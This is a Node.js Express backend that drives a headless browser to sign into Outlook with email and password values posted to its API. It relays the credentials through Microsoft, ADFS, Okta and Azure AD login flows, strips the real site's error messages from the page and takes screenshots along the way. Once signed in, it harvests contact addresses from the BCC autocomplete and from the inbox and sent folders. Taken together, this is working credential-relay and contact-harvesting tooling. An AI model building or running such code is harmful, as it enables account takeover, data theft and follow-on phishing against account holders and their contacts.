const express = require('express');
const cors = require('cors');
const path = require('path');
const { OutlookLoginAutomation } = require('./src/outlook-login');

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware - Configure CORS for Replit environment
app.use(cors({
    origin: true, // Allow all origins for Replit proxy
    credentials: true
}));
app.use(express.json());
app.use(express.static('public'));

// Store single automation instance - only one session allowed
let activeSession = null; // { sessionId, automation, isPreloaded, createdAt, email }
const SESSION_TIMEOUT = 60 * 60 * 1000; // 60 minutes timeout for large scans
const OPERATION_TIMEOUT = 10 * 60 * 1000; // 10 minutes for large scanning operations
const HEALTH_CHECK_INTERVAL = 2 * 60 * 1000; // 2 minutes
let sessionMutex = null; // Prevents race conditions in session management
let initializingSession = false; // Prevents concurrent browser initialization

// Helper function to initialize browser directly - Prevents concurrent initialization
async function initBrowser(session) {
    // Prevent concurrent browser initialization
    if (initializingSession) {
        throw new Error('Browser initialization already in progress');
    }

    initializingSession = true;

    try {
        // Close any existing automation with proper timeout
        if (session.automation) {
            try {
                console.log(`Gracefully closing existing automation for session ${session.sessionId}...`);
                await Promise.race([
                    session.automation.close().catch(err => console.error('Session close error:', err)),
                    new Promise((_, reject) => setTimeout(() => reject(new Error('Close timeout')), 5000))
                ]);
                await new Promise(resolve => setTimeout(resolve, 1000)); // Wait 1 second after close
            } catch (error) {
                console.error('Error closing existing session:', error);
            }
            session.automation = null;
        }

        session.automation = new OutlookLoginAutomation();
        await session.automation.init();

        console.log(`Browser initialized successfully for session ${session.sessionId}`);
        return session.automation;
    } catch (error) {
        console.error(`Failed to initialize browser for session ${session.sessionId}:`, error);
        session.automation = null;
        throw error;
    } finally {
        initializingSession = false;
    }
}

// Cleanup expired session - Avoid race conditions with active operations
setInterval(async () => {
    if (activeSession && !sessionMutex && !initializingSession) {
        const now = Date.now();
        // Only cleanup if session is expired AND not currently in use
        if (now - activeSession.createdAt > SESSION_TIMEOUT && !activeSession.inUse) {
            console.log(`🧹 Cleaning up expired session: ${activeSession.sessionId}`);
            
            // Set mutex to prevent other operations during cleanup
            sessionMutex = Promise.resolve();
            
            try {
                if (activeSession.automation) {
                    await activeSession.automation.close();
                }
                activeSession = null;
            } catch (error) {
                console.error(`Error closing expired session ${activeSession.sessionId}:`, error);
            } finally {
                sessionMutex = null;
            }
        }
    }
}, 5 * 60 * 1000); // Check every 5 minutes

// Health check for browser sessions
setInterval(async () => {
    if (activeSession && activeSession.automation && !sessionMutex && !initializingSession) {
        try {
            // Check if browser is still connected
            const automation = activeSession.automation;
            if (automation.browser && !automation.browser.isConnected()) {
                console.log(`🔧 Detected disconnected browser for session ${activeSession.sessionId}`);
                
                // Clean up disconnected session
                sessionMutex = Promise.resolve();
                try {
                    await automation.close();
                    activeSession = null;
                    console.log('Cleaned up disconnected browser session');
                } catch (error) {
                    console.error('Error cleaning up disconnected session:', error);
                } finally {
                    sessionMutex = null;
                }
            }
        } catch (error) {
            console.error('Health check error:', error);
        }
    }
}, HEALTH_CHECK_INTERVAL);

// Helper function to get or create session (only one allowed) - Thread-safe with mutex
async function getOrCreateSession(sessionId = null) {
    // Wait for any ongoing session operations to complete
    while (sessionMutex) {
        await new Promise(resolve => setTimeout(resolve, 100));
    }

    // Acquire mutex
    sessionMutex = Promise.resolve();

    try {
        // If there's an active session and it matches the requested one, return it
        if (activeSession && sessionId && activeSession.sessionId === sessionId) {
            return { sessionId: activeSession.sessionId, session: activeSession, isNew: false };
        }

        // Close any existing session before creating a new one
        if (activeSession) {
            console.log(`🔄 Closing existing session: ${activeSession.sessionId}`);
            try {
                if (activeSession.automation) {
                    await Promise.race([
                        activeSession.automation.close().catch(err => console.error('Session close error:', err)),
                        new Promise((_, reject) => setTimeout(() => reject(new Error('Close timeout')), 3000))
                    ]);
                    await new Promise(resolve => setTimeout(resolve, 500)); // Brief wait after close
                }
            } catch (error) {
                console.error(`Error closing existing session:`, error);
            }
            activeSession = null;
        }

        // Create new single session
        const newSessionId = Date.now().toString();
        activeSession = {
            sessionId: newSessionId,
            automation: null,
            isPreloaded: false,
            createdAt: Date.now(),
            email: null,
            inUse: false // Track if session is being actively used
        };

        console.log(`📝 Created new session: ${newSessionId} (Single session mode)`);
        return { sessionId: newSessionId, session: activeSession, isNew: true };

    } finally {
        // Release mutex
        sessionMutex = null;
    }
}

// Routes

// Health check
app.get('/api/health', (req, res) => {
    res.json({ status: 'OK', message: 'Outlook Automation Backend is running' });
});

// Preload Outlook page
app.post('/api/preload', async (req, res) => {
    try {
        const requestedSessionId = req.body.sessionId;
        const { sessionId, session, isNew } = await getOrCreateSession(requestedSessionId);

        // Mark session as in use to prevent cleanup during operation
        session.inUse = true;

        try {
            // If already preloaded for this session, return status
            if (session.isPreloaded && session.automation) {
                return res.json({
                    status: 'already-loaded',
                    message: 'Outlook page is already loaded and ready',
                    sessionId: sessionId
                });
            }

        // Close any existing automation for this session
        if (session.automation) {
            console.log(`Closing existing automation for session ${sessionId}...`);
            try {
                await session.automation.close();
            } catch (error) {
                console.error('Error closing existing session:', error);
            }
        }

        // Start new automation session for preloading
        console.log(`Preloading Outlook page for session ${sessionId}...`);

        // Initialize browser directly with error handling and timeout
        try {
            await Promise.race([
                initBrowser(session),
                new Promise((_, reject) => setTimeout(() => reject(new Error('Browser initialization timeout')), OPERATION_TIMEOUT))
            ]);
        } catch (error) {
            console.error('Failed to initialize browser:', error);
            
            // Clean up on timeout or error
            if (session.automation) {
                try {
                    await session.automation.close();
                } catch (closeError) {
                    console.error('Error cleaning up failed initialization:', closeError);
                }
                session.automation = null;
            }
            
            return res.status(500).json({ 
                error: 'Failed to initialize browser',
                details: error.message,
                retryable: true
            });
        }

        // Navigate to Outlook with timeout
        try {
            const navigated = await Promise.race([
                session.automation.navigateToOutlook(),
                new Promise((_, reject) => setTimeout(() => reject(new Error('Navigation timeout')), OPERATION_TIMEOUT))
            ]);
            
            if (!navigated) {
                throw new Error('Navigation failed');
            }
        } catch (error) {
            console.error('Failed to navigate to Outlook:', error);
            
            // Clean up on navigation failure
            try {
                await session.automation.close();
            } catch (closeError) {
                console.error('Error cleaning up after navigation failure:', closeError);
            }
            session.automation = null;
            session.isPreloaded = false;
            
            return res.status(500).json({ 
                error: 'Failed to preload Outlook page',
                details: error.message
            });
        }

        session.isPreloaded = true;
        console.log(`Outlook page preloaded successfully for session ${sessionId}`);

            res.json({
                status: 'preloaded',
                message: 'Outlook page loaded and ready for email input',
                sessionId: sessionId
            });

        } finally {
            // Mark session as no longer in use
            if (session) {
                session.inUse = false;
            }
        }

    } catch (error) {
        console.error('Error preloading Outlook:', error);

        res.status(500).json({ 
            error: 'Failed to preload Outlook',
            details: error.message 
        });
    }
});

// Process email login (uses preloaded page if available)
app.post('/api/login', async (req, res) => {
    try {
        const { email, password, sessionId: requestedSessionId } = req.body;

        if (!email) {
            return res.status(400).json({ 
                error: 'Email is required' 
            });
        }

        const { sessionId, session, isNew } = await getOrCreateSession(requestedSessionId);
        session.email = email; // Store email in session
        
        // Mark session as in use to prevent cleanup during login
        session.inUse = true;

        try {
            // If not preloaded, start fresh session
        if (!session.isPreloaded || !session.automation) {
            console.log(`Starting fresh Puppeteer session for email: ${email} (Session: ${sessionId})`);

            // Close any existing automation
            if (session.automation) {
                try {
                    await session.automation.close();
                } catch (error) {
                    console.error('Error closing existing session:', error);
                }
            }

            // Initialize browser directly with error handling
            try {
                await initBrowser(session);
            } catch (error) {
                console.error('Failed to initialize browser for login:', error);
                return res.status(500).json({ 
                    error: 'Failed to initialize browser',
                    details: error.message,
                    retryable: true
                });
            }

            // Navigate to Outlook
            const navigated = await session.automation.navigateToOutlook();
            if (!navigated) {
                await session.automation.close();
                session.automation = null;
                session.isPreloaded = false;
                return res.status(500).json({ 
                    error: 'Failed to navigate to Outlook' 
                });
            }

            session.isPreloaded = true;
        } else {
            console.log(`Using preloaded Outlook page for email: ${email} (Session: ${sessionId})`);
        }

        // Force fresh login - no checking for existing sessions

        // If password is provided, perform full login
        if (password) {
            let loginSuccess = false;
            let authMethod = 'password';

            console.log('🔐 Proceeding with password login...');

            // If cookie auth failed, do full password login
            if (!loginSuccess) {
                console.log('🔐 Performing full password login...');
                loginSuccess = await session.automation.performLogin(email, password);
                authMethod = 'password';

                // Login successful - no cookie saving
                if (loginSuccess) {
                    console.log('✅ Login completed successfully');
                }
            }

            // Take screenshot after login attempt
            await session.automation.takeScreenshot(`screenshots/session-${sessionId}-login.png`);

            res.json({
                sessionId: sessionId,
                email: email,
                loginComplete: true,
                loginSuccess: loginSuccess,
                authMethod: authMethod,
                message: loginSuccess ? 
                    (authMethod === 'cookies' ? 'Login successful using saved cookies!' : 'Login successful with password! Enhanced session saved.') : 
                    'Login failed or additional authentication required',
                screenshots: [
                    `screenshots/session-${sessionId}-login.png`
                ]
            });
        } else {
            // Fill email and click Next to get site response
            console.log('Filling email and clicking Next to get site response...');

            let siteReport = {
                emailFilled: false,
                nextClicked: false,
                siteResponse: '',
                errorMessages: [],
                pageUrl: '',
                pageTitle: '',
                needsPassword: false,
                needsMFA: false,
                accountExists: false
            };

            try {
                // Wait for email input and fill it
                await session.automation.page.waitForSelector('input[type="email"]', { timeout: 10000 });
                await session.automation.page.type('input[type="email"]', email);
                console.log('Email entered successfully');
                siteReport.emailFilled = true;

                // Click Next button
                await session.automation.page.click('input[type="submit"]');
                console.log('Clicked Next button');
                siteReport.nextClicked = true;

                // Wait for page response (up to 10 seconds)
                await new Promise(resolve => setTimeout(resolve, 3000));

                // Get current page info
                siteReport.pageUrl = session.automation.page.url();
                siteReport.pageTitle = await session.automation.page.title();

                // Check for different scenarios

                // Check for password field (account exists)
                const passwordField = await session.automation.page.$('input[type="password"]');
                if (passwordField) {
                    siteReport.needsPassword = true;
                    siteReport.accountExists = true;
                    siteReport.siteResponse = 'Password field appeared - account exists and is ready for password entry';
                    console.log('Password field detected - account exists');
                }

                // Remove bordered error messages from HTML and only capture specific "account not found" error
                const errorSelectors = [
                    '[role="alert"]',
                    '.error',
                    '.ms-TextField-errorMessage',
                    '[data-testid="error"]',
                    '.alert-error',
                    '[aria-live="polite"]',
                    '.form-error'
                ];

                let foundAccountNotFoundError = false;
                for (let selector of errorSelectors) {
                    const errorElements = await session.automation.page.$$(selector);
                    for (let element of errorElements) {
                        try {
                            const errorText = await element.evaluate(el => el.textContent);
                            if (errorText && errorText.trim()) {
                                // Only capture the specific "account not found" error message
                                if (errorText.includes("We couldn't find an account with that username")) {
                                    siteReport.errorMessages.push(errorText.trim());
                                    console.log(`Found error message: ${errorText.trim()}`);
                                    foundAccountNotFoundError = true;
                                } else {
                                    // Remove all other bordered error messages from HTML
                                    await element.evaluate(el => el.remove());
                                }
                            }
                        } catch (e) {
                            // Skip if can't get text
                        }
                    }
                }

                // If account not found error, reload the page to reset the form
                if (foundAccountNotFoundError) {
                    console.log('Account not found error detected - reloading Outlook page for retry...');

                    // Navigate back to Outlook to reset the form
                    const reloaded = await session.automation.navigateToOutlook();
                    if (!reloaded) {
                        siteReport.siteResponse = 'Failed to reload page after account error';
                    } else {
                        siteReport.siteResponse = 'Page reloaded - ready for new email attempt';
                        siteReport.needsPassword = false;
                        siteReport.accountExists = false;
                        console.log('Page successfully reloaded and ready for new email');
                    }
                }

                // Check for MFA/2FA prompts
                const mfaSelectors = [
                    'input[type="tel"]',
                    '[data-testid="phone"]', 
                    '[data-testid="authenticator"]',
                    '.verification'
                ];

                for (let selector of mfaSelectors) {
                    const mfaElement = await session.automation.page.$(selector);
                    if (mfaElement) {
                        siteReport.needsMFA = true;
                        siteReport.siteResponse = 'Multi-factor authentication required';
                        console.log('MFA prompt detected');
                        break;
                    }
                }

                // If no specific response detected, get general page content
                if (!siteReport.siteResponse) {
                    try {
                        // Look for main content or messages
                        const mainContent = await session.automation.page.$eval('body', el => {
                            // Remove scripts and styles
                            const scripts = el.querySelectorAll('script, style, noscript');
                            scripts.forEach(s => s.remove());

                            // Get visible text content
                            const text = el.textContent || '';
                            return text.replace(/\s+/g, ' ').trim().substring(0, 500);
                        });

                        siteReport.siteResponse = mainContent || 'Page loaded but no specific response detected';
                    } catch (e) {
                        siteReport.siteResponse = 'Page loaded successfully';
                    }
                }

                // Take screenshot after clicking Next
                await session.automation.takeScreenshot(`screenshots/session-${sessionId}-after-next.png`);

                console.log('Site report:', JSON.stringify(siteReport, null, 2));

            } catch (error) {
                console.error('Error during email/next process:', error);
                siteReport.errorMessages.push(`Automation error: ${error.message}`);
                siteReport.siteResponse = `Error occurred: ${error.message}`;
            }

            res.json({
                sessionId: sessionId,
                email: email,
                loginComplete: false,
                siteReport: siteReport,
                message: siteReport.needsPassword ? 
                    'Email verified! Account exists and is ready for password.' : 
                    siteReport.errorMessages.length > 0 ? 
                    'Issues detected with email - see site report for details.' :
                    'Email processed - see site report for response.',
                screenshots: [
                    `screenshots/session-${sessionId}-after-next.png`
                ]
            });
        }

        } finally {
            // Mark session as no longer in use
            if (activeSession) {
                activeSession.inUse = false;
            }
        }

    } catch (error) {
        console.error('Error during login process:', error);

        // Clean up on error
        if (activeSession && activeSession.automation) {
            try {
                await activeSession.automation.close();
            } catch (closeError) {
                console.error('Error closing automation on error:', closeError);
            }
            activeSession.automation = null;
            activeSession.isPreloaded = false;
            activeSession.inUse = false;
        }

        res.status(500).json({ 
            error: 'Login process failed',
            details: error.message 
        });
    }
});

// Continue with password (for cases where email was filled first)
app.post('/api/continue-login', async (req, res) => {
    try {
        const { password, sessionId: requestedSessionId } = req.body;

        if (!password) {
            return res.status(400).json({ 
                error: 'Password is required' 
            });
        }

        if (!activeSession || !activeSession.automation) {
            return res.status(400).json({ 
                error: 'No active session. Please start with email first.' 
            });
        }

        console.log('Continuing login with password...');

        // Continue the login process with provider detection
        try {
            // Detect the current login provider
            const loginProvider = await activeSession.automation.detectLoginProvider();
            console.log(`Detected login provider for password entry: ${loginProvider}`);

            // Handle password entry based on the provider
            let passwordSuccess = false;

            if (loginProvider === 'microsoft') {
                passwordSuccess = await activeSession.automation.handleMicrosoftLogin(password);
            } else if (loginProvider === 'adfs') {
                passwordSuccess = await activeSession.automation.handleADFSLogin(password);
            } else if (loginProvider === 'okta') {
                passwordSuccess = await activeSession.automation.handleOktaLogin(password);
            } else if (loginProvider === 'azure-ad') {
                passwordSuccess = await activeSession.automation.handleAzureADLogin(password);
            } else if (loginProvider === 'generic-saml') {
                passwordSuccess = await activeSession.automation.handleGenericSAMLLogin(password);
            } else {
                console.warn(`Unknown login provider in continue-login. Attempting generic login...`);
                passwordSuccess = await activeSession.automation.handleGenericLogin(password);
            }

            if (!passwordSuccess) {
                console.warn('Password login attempt failed, but continuing with flow...');
            }

            // Take screenshot after password submission
            await activeSession.automation.takeScreenshot(`screenshots/session-${activeSession.sessionId}-after-password.png`);
            console.log(`Screenshot saved after password submission`);

            // Handle "Stay signed in?" prompt
            await activeSession.automation.handleStaySignedInPrompt();

            // Wait a bit more after handling the prompt
            await new Promise(resolve => setTimeout(resolve, 3000));

            // Take screenshot after login
            await activeSession.automation.takeScreenshot(`screenshots/session-${activeSession.sessionId}-final.png`);

            // Check if we're successfully logged in
            const currentUrl = activeSession.automation.page.url();
            const loginSuccess = currentUrl.includes('outlook.office.com/mail');

            let responseMessage = '';
            if (loginSuccess) {
                responseMessage = 'Login completed successfully!';
            } else {
                responseMessage = 'Login may require additional verification';
            }

            res.json({
                sessionId: activeSession.sessionId,
                loginComplete: true,
                loginSuccess: loginSuccess,
                message: responseMessage,
                screenshot: `screenshots/session-${activeSession.sessionId}-final.png`,
                passwordScreenshot: `screenshots/session-${activeSession.sessionId}-after-password.png`
            });

        } catch (error) {
            console.error('Error during password entry:', error);
            res.status(500).json({ 
                error: 'Failed to complete login',
                details: error.message 
            });
        }

    } catch (error) {
        console.error('Error in continue-login:', error);
        res.status(500).json({ 
            error: 'Continue login failed',
            details: error.message 
        });
    }
});

// Take screenshot of current state
app.post('/api/screenshot', async (req, res) => {
    try {
        const { sessionId: requestedSessionId } = req.body;
        const { sessionId, session } = await getOrCreateSession(requestedSessionId);

        if (!session.automation) {
            return res.status(400).json({ 
                error: 'No active automation session' 
            });
        }

        const filename = `screenshots/session-${sessionId}-${Date.now()}.png`;
        await session.automation.takeScreenshot(filename);

        res.json({
            sessionId: sessionId,
            screenshot: filename,
            message: 'Screenshot taken successfully'
        });

    } catch (error) {
        console.error('Error taking screenshot:', error);
        res.status(500).json({ 
            error: 'Failed to take screenshot',
            details: error.message 
        });
    }
});

// Check emails (if logged in)
app.get('/api/emails', async (req, res) => {
    try {
        const { sessionId: requestedSessionId } = req.query;
        const { sessionId, session } = await getOrCreateSession(requestedSessionId);

        if (!session.automation) {
            return res.status(400).json({ 
                error: 'No active automation session' 
            });
        }

        const emailAddresses = await session.automation.checkEmails();

        res.json({
            sessionId: sessionId,
            emailAddresses: emailAddresses,
            count: emailAddresses.length
        });

    } catch (error) {
        console.error('Error checking emails:', error);
        res.status(500).json({ 
            error: 'Failed to check emails',
            details: error.message 
        });
    }
});

// BCC Contact Harvesting endpoint
app.get('/api/emails/harvest-bcc', async (req, res) => {
    try {
        const { sessionId: requestedSessionId } = req.query;
        const { sessionId, session } = await getOrCreateSession(requestedSessionId);

        if (!session.automation) {
            return res.status(400).json({ 
                error: 'No active automation session. Please login first.' 
            });
        }

        // Mark session as in use to prevent cleanup during harvesting
        session.inUse = true;

        try {
            console.log('🎯 Starting BCC contact harvesting process...');
            
            // Check if we're logged in to Outlook
            const currentUrl = session.automation.page.url();
            if (!currentUrl.includes('outlook.office.com/mail')) {
                return res.status(400).json({
                    error: 'Not logged in to Outlook. Please complete login first.',
                    currentUrl: currentUrl
                });
            }

            // Start the BCC harvesting process
            const harvestedContacts = await Promise.race([
                session.automation.harvestBccContacts(),
                new Promise((_, reject) => 
                    setTimeout(() => reject(new Error('BCC harvesting timeout after 15 minutes')), 15 * 60 * 1000)
                )
            ]);

            // Prepare response with detailed information
            const response = {
                sessionId: sessionId,
                method: 'bcc-harvest',
                success: true,
                emailAddresses: harvestedContacts,
                count: harvestedContacts.length,
                harvestTimestamp: new Date().toISOString(),
                summary: {
                    totalContacts: harvestedContacts.length,
                    method: 'BCC Contact Suggestions',
                    source: 'Outlook Compose BCC Field'
                },
                message: harvestedContacts.length > 0 ? 
                    `Successfully harvested ${harvestedContacts.length} email contacts using BCC method!` :
                    'BCC harvesting completed but no contacts were found. This may be normal if no contacts exist in your directory.',
                instructions: {
                    copyAll: 'Use the emailAddresses array to copy all harvested contacts',
                    format: 'All contacts are provided as lowercase email addresses',
                    usage: 'These contacts can be used for mailing lists or contact management'
                }
            };

            // Add sampling for large datasets
            if (harvestedContacts.length > 50) {
                response.sample = {
                    first10: harvestedContacts.slice(0, 10),
                    last10: harvestedContacts.slice(-10),
                    note: `Showing first/last 10 contacts. All ${harvestedContacts.length} contacts are in the emailAddresses array.`
                };
            }

            console.log(`✅ BCC harvesting API response ready with ${harvestedContacts.length} contacts`);
            res.json(response);

        } finally {
            // Mark session as no longer in use
            if (session) {
                session.inUse = false;
            }
        }

    } catch (error) {
        console.error('❌ Error in BCC harvesting API:', error);
        
        // Mark session as no longer in use
        if (activeSession) {
            activeSession.inUse = false;
        }

        res.status(500).json({ 
            error: 'BCC contact harvesting failed',
            details: error.message,
            method: 'bcc-harvest',
            success: false,
            troubleshooting: {
                commonIssues: [
                    'Ensure you are logged in to Outlook',
                    'Check that your account has contacts or a directory',
                    'Verify Outlook interface loaded correctly',
                    'Some organizations may restrict contact directory access'
                ],
                retryAdvice: 'Try logging out and back in, then retry the harvesting process'
            }
        });
    }
});

// New comprehensive email scanning endpoint
app.get('/api/emails/scan-all', async (req, res) => {
    try {
        const { sessionId: requestedSessionId } = req.query;
        const { sessionId, session } = await getOrCreateSession(requestedSessionId);

        if (!session.automation) {
            return res.status(400).json({ 
                error: 'No active automation session' 
            });
        }

        console.log('Starting comprehensive email scan...');
        const allEmails = await session.automation.scanAllEmails();

        // Combine all unique email addresses from both folders
        const allUniqueEmails = new Set([
            ...(allEmails.inbox || []),
            ...(allEmails.sent || [])
        ]);
        const emailAddresses = Array.from(allUniqueEmails);

        const response = {
            sessionId: sessionId,
            emailAddresses: emailAddresses, // Array of unique email addresses
            data: {
                inbox: allEmails.inbox || [],
                sent: allEmails.sent || []
            },
            summary: {
                inboxCount: allEmails.inbox?.length || 0,
                sentCount: allEmails.sent?.length || 0,
                totalUniqueEmails: emailAddresses.length,
                totalCount: (allEmails.inbox?.length || 0) + (allEmails.sent?.length || 0)
            },
            scanTimestamp: new Date().toISOString()
        };

        if (allEmails.error) {
            response.warning = allEmails.error;
        }

        res.json(response);

    } catch (error) {
        console.error('Error during comprehensive email scan:', error);
        res.status(500).json({ 
            error: 'Failed to scan all emails',
            details: error.message 
        });
    }
});

// Close current session
app.delete('/api/session', async (req, res) => {
    try {
        const { sessionId: requestedSessionId } = req.body;

        if (!activeSession) {
            return res.status(400).json({ 
                error: 'No active session to close' 
            });
        }

        if (activeSession.automation) {
            await activeSession.automation.close();
        }

        activeSession = null;

        res.json({
            sessionId: requestedSessionId,
            message: 'Session closed successfully'
        });

    } catch (error) {
        console.error('Error closing session:', error);
        res.status(500).json({ 
            error: 'Failed to close session',
            details: error.message 
        });
    }
});

// Handle back navigation - reload Outlook page
app.post('/api/back', async (req, res) => {
    try {
        const { sessionId: requestedSessionId } = req.body;
        const { sessionId, session } = await getOrCreateSession(requestedSessionId);

        if (!session.automation) {
            return res.status(400).json({ 
                error: 'No active session' 
            });
        }

        console.log('Back button clicked - auto reloading Outlook page...');

        // Navigate back to Outlook to reset the form
        const reloaded = await session.automation.navigateToOutlook();
        if (!reloaded) {
            return res.status(500).json({ 
                error: 'Failed to reload Outlook page' 
            });
        }

        console.log('Page successfully reloaded after back navigation');

        res.json({
            sessionId: sessionId,
            message: 'Outlook page reloaded successfully',
            status: 'reloaded'
        });

    } catch (error) {
        console.error('Error during back navigation reload:', error);
        res.status(500).json({ 
            error: 'Failed to reload page on back navigation',
            details: error.message 
        });
    }
});

// Get current session status
app.get('/api/status', (req, res) => {
    res.json({
        hasActiveSession: activeSession !== null,
        sessionCount: activeSession ? 1 : 0,
        sessionId: activeSession ? activeSession.sessionId : null
    });
});

// Extend session timeout by making a request
app.post('/api/extend-session', async (req, res) => {
    try {
        const { sessionId: requestedSessionId } = req.body;
        
        if (!activeSession) {
            return res.status(400).json({ error: 'No active session found.' });
        }

        if (requestedSessionId && activeSession.sessionId !== requestedSessionId) {
            return res.status(400).json({ error: 'Provided sessionId does not match active session.' });
        }

        activeSession.createdAt = Date.now();
        console.log(`Session ${activeSession.sessionId} timeout extended.`);
        res.json({ message: 'Session timeout extended.', sessionId: activeSession.sessionId });

    } catch (error) {
        console.error('Error extending session:', error);
        res.status(500).json({ error: 'Failed to extend session.', details: error.message });
    }
});

// Session endpoints removed - no session saving

// Serve frontend
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error('Unhandled error:', err);
    res.status(500).json({ 
        error: 'Internal server error',
        details: err.message 
    });
});

// Graceful shutdown
// Graceful shutdown handling for multiple signals
const gracefulShutdown = async (signal) => {
    console.log(`\n🔄 Received ${signal}. Shutting down server...`);

    // Close active automation session
    if (activeSession) {
        try {
            console.log(`Closing session ${activeSession.sessionId}...`);
            if (activeSession.automation) {
                await Promise.race([
                    activeSession.automation.close(),
                    new Promise((_, reject) => setTimeout(() => reject(new Error('Shutdown timeout')), 5000))
                ]);
            }
        } catch (error) {
            console.error(`Error closing session ${activeSession.sessionId}:`, error);
        }
    }

    activeSession = null;
    console.log('✅ All sessions closed. Server shutdown complete.');
    process.exit(0);
};

process.on('SIGINT', gracefulShutdown);
process.on('SIGTERM', gracefulShutdown);
process.on('SIGQUIT', gracefulShutdown);

// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Outlook Automation Backend running on port ${PORT}`);
    console.log(`📧 API endpoints available at http://localhost:${PORT}/api/`);
    console.log(`🌐 Frontend available at http://localhost:${PORT}/`);
});